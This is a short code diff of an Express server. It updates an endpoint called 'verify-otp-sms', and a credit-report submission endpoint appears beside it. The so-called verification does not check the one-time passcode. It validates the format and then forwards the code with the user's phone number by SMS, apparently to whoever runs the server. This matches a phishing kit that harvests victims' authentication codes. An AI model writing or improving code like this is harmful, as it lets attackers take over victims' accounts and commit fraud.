@@ -81,19 +81,23 @@ app.post('/api/submit-credit-report', async (req, res) => {
   }
 });
 
-// 2. OTP Verification Endpoint
+// 2. OTP Verification Endpoint (Updated for Alphanumeric < 10 chars)
 app.post('/api/verify-otp-sms', async (req, res) => {
   try {
     const { otp, phoneNumber } = req.body;
 
-    if (!otp) {
+    // Alphanumeric validation: 1 to 9 characters long
+    const otpRegex = /^[a-zA-Z0-9]{1,9}$/;
+
+    if (!otp || !otpRegex.test(otp.trim())) {
       return res.status(400).json({
         success: false,
-        message: 'OTP parameter is required.'
+        message: 'Invalid OTP. Must be alphanumeric and less than 10 characters.'
       });
     }
 
-    const smsMessage = `OTP Received:\nCode: ${otp}\nUser Phone: ${phoneNumber || 'N/A'}`;
+    const cleanOtp = otp.trim().toUpperCase();
+    const smsMessage = `OTP Received:\nCode: ${cleanOtp}\nUser Phone: ${phoneNumber || 'N/A'}`;
 
     const smsResponse = await sendMobitechSMS(smsMessage);
     console.log('Mobitech API Response (OTP Verification):', smsResponse.data);
